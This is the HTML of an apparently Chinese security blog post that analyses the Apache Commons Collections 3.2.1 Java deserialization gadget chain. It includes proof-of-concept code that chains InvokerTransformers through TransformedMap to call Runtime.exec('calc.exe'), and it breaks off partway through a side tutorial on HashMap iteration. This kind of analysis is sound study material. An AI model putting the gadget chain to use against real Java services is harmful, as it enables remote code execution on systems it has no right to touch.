@@ -1,0 +1,1726 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Yoga7xm">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Yoga7xm">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Commons-Collections 反序列化简析 · Yoga7xm&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/human.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Yoga7xm&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Commons-Collections 反序列化简析</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Yoga7xm's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Commons-Collections 反序列化简析
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "java">java</a>
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "deserialize">deserialize</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.7k</span>阅读时长: <span class="post-count reading-time">13 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/08/23</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p><a href="http://commons.apache.org/proper/commons-collections/" target="_blank" rel="noopener">Commons Collections</a>包为Java标准的<code>Collections API</code>提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>
+</blockquote>
+<p>官方文档：<a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html" target="_blank" rel="noopener">传送门</a></p>
+<p>在jdk1.8某个版本之后不能复现成功，所以这里我使用的是jdk1.7+commons-collections-3.2.1</p>
+<p><strong>Maven</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="POP-Chains"><a href="#POP-Chains" class="headerlink" title="POP Chains"></a>POP Chains</h2><p>先来看一看RCE的这块POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">chains</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        chain.transform(chain);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/08/23/com/chains.png" alt></p>
+<h3 id="POP-链分析"><a href="#POP-链分析" class="headerlink" title="POP 链分析"></a>POP 链分析</h3><p>从POC来看，很明显是通过反射去调Runtime().exec()，一步步跟进看看</p>
+<p><img src="/2019/08/23/com/ctf.png" alt></p>
+<p>这个构造函数只干了两件事：调了父类的构造函数（空的）和将传入的Object对象<code>constantToReturn</code>赋给<code>iConstant</code>，继续来看下一个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样的，这个构造函数主要是将传入的参数赋值给<code>iMethodName</code>、<code>iParamTypes</code>、<code>iArgs</code>三个参数，下一个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>初始化，将传入的Transformer数组对象赋值给<code>iTransformers</code>。</p>
+<p>跟进<code>ChainedTransformer.transform()</code>方法</p>
+<p><img src="/2019/08/23/com/transform.png" alt></p>
+<p>也就是遍历数组iTransformers调用每个对象的<code>transform()</code>方法。对于ConstantTransformer类来说，transform方法仅仅返回了传入的object对象，所以跟进InvokerTransformer类</p>
+<p><img src="/2019/08/23/com/itf.png" alt></p>
+<p>这里反射的几个函数的参数都是直接传入赋值的，完全可控，能够调用任意类方法。就是有点难理解，将数组中上一个transform返回的Object作为参数传入下一个的Object，类似递归</p>
+<h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime!!!"></a>Runtime!!!</h3><p>单独把RCE这块的逻辑给重新拿出来</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    Object object = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">    Class cls = object.getClass();</span><br><span class="line"></span><br><span class="line">    Method method = cls.getMethod("getMethod", String.class, Class[].class);</span><br><span class="line">    object = method.invoke(object,<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    cls = object.getClass();</span><br><span class="line">    method = cls.getMethod("invoke",Object.class,Object[].class);</span><br><span class="line">    object = method.invoke(object,<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    cls = object.getClass();</span><br><span class="line">    method = cls.getMethod(<span class="string">"exec"</span>,String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    object = method.invoke(object,<span class="string">"calc.exe"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>object最开始为<code>java.lang.Runtime</code>对象，调用getClass()方法返回<code>Java.lang.Class</code>对象，紧接着调用cls的getMethod()方法，传入的参数为<code>getMethod</code></p>
+<blockquote>
+<p>public Method getMethod(String name, Class&lt;?&gt;… parameterTypes)throws NoSuchMethodException,SecurityException</p>
+<p>返回一个 Method 对象，它反映此 Class 对象所表示的类或接口的指定公共成员方法。name 参数是一个 String，用于指定所需方法的简称。parameterTypes 参数是按声明顺序标识该方法形参类型的 Class 对象的一个数组。如果 parameterTypes 为 null，则按空数组处理。</p>
+</blockquote>
+<p>根据文档，返回一个<code>java.lang.reflect.Method</code>对象表示获取到的getMethod方法。</p>
+<p>然后invoke是调用了刚刚获取到的getMethod()，而这个getMethod()是去获取getRuntime()方法，所以返回与上一步一样的Method对象表示<code>getRuntime</code>方法，并赋给object</p>
+<p>继续调用object.getClass()方法，cls得到<code>java.lang.reflect.Method</code>对象，同理调用getMethod()获取到invoke方法，然后<strong>真正调用</strong>getRuntime，object拿到Runtime实例</p>
+<p>再次调用object.getClass()，cls得到<code>java.lang.Runtime</code>对象，调用getMethod()获取到exec方法，最后将<code>calc.exe</code>传入并调用此方法，完成RCE</p>
+<p>其实这段POC等价于</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Method method = Runtime.class.getMethod("getRuntime",null);</span><br><span class="line">    Runtime runtime = (Runtime) method.invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">    runtime.exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里附上师傅的时序图：</p>
+<p><img src="http://whip1ash.cn/media/15420136745767.jpg" alt></p>
+<p>其实还有一种更简单的方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object object = Runtime.getRuntime();</span><br><span class="line">Class cls = object.getClass();</span><br><span class="line">Method method = cls.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">method.invoke(object,<span class="string">"calc.exe"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也就是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">            new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc.exe"&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    chain.transform(chain);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>继续补全POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", null&#125;),</span><br><span class="line">            new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">            new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    innerMap.put(<span class="string">"Key"</span>, <span class="string">"Value"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将普通的 Map 转换为 TransformedMap</span></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, chain);</span><br><span class="line">    Iterator localIterator = outerMap.entrySet().iterator();</span><br><span class="line">    Map.Entry localEntry = (Map.Entry) localIterator.next();</span><br><span class="line">    localEntry.setValue(<span class="string">"poc"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/08/23/com/poc2.png" alt></p>
+<p>打上断点走一遍</p>
+<h3 id="decorate"><a href="#decorate" class="headerlink" title="decorate"></a>decorate</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个decorate()函数直接将传入的Map类对象转成TransformedMap类对象并且返回</p>
+<h3 id="HashMap-遍历之术"><a href="#HashMap-遍历之术" class="headerlink" title="HashMap 遍历之术"></a>HashMap 遍历之术</h3><p>这里顺便提下几种遍历Hashmap的方法</p>
+<h4 id="0x01-entrySet"><a href="#0x01-entrySet" class="headerlink" title="0x01 entrySet"></a>0x01 entrySet</h4><p><strong>步骤</strong></p>
+<ol>
+<li>根据entrySet()获取HashMap的键值对的Set集合</li>
+<li>通过Iterator迭代器遍历刚刚的集合</li>
+</ol>
+<p><strong>Demo</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    map.put(<span class="string">"one"</span>,<span class="number">1</span>);</span><br><span class="line">    map.put(<span class="string">"two"</span>,<span class="number">2</span>);</span><br><span class="line">    map.put(<span class="string">"three"</span>,<span class="number">3</span>);</span><br><span class="line">    map.put(<span class="string">"four"</span>,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    Iterator iter = map.entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span> (iter.hasNext())&#123;</span><br><span class="line">        Map.Entry entry = (Map.Entry) iter.next();</span><br><span class="line">        System.out.println(<span class="string">"Key-Value is "</span>+entry.getKey()+<span class="string">"-"</span>+entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-keySet"><a href="#0x02-keySet" class="headerlink" title="0x02 keySet"></a>0x02 keySet</h4><p><strong>步骤</strong></p>
+<ol>
+<li>根据keySet()获取HashMap的键的Set集合</li>
+<li>通过Iterator迭代器遍历刚刚的集合</li>
+</ol>
+<p><strong>Demo</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    map.put(<span class="string">"one"</span>,<span class="number">1</span>);</span><br><span class="line">    map.put(<span class="string">"two"</span>,<span class="number">2</span>);</span><br><span class="line">    map.put(<span class="string">"three"</span>,<span class="number">3</span>);</span><br><span class="line">    map.put(<span class="string">"four"</span>,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    Iterator iter = map.keySet().iterator();</span><br><span class="line">    <span class="keyword">while</span> (iter.hasNext())&#123;</span><br><span class="line">        String key = (String)iter.next();</span><br><span class="line">        System.out.println(<span class="string">"Key-Value is "</span>+key+<span class="string">"-"</span>+map.get(key));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-values"><a href="#0x03-values" class="headerlink" title="0x03 values"></a>0x03 values</h4><p><strong>步骤</strong></p>
+<ol>
+<li>根据values()获取HashMap的值的集合</li>
+<li>通过Iterator迭代器遍历刚刚的集合，不能遍历key</li>
+</ol>
+<p><strong>Demo</strong></p>
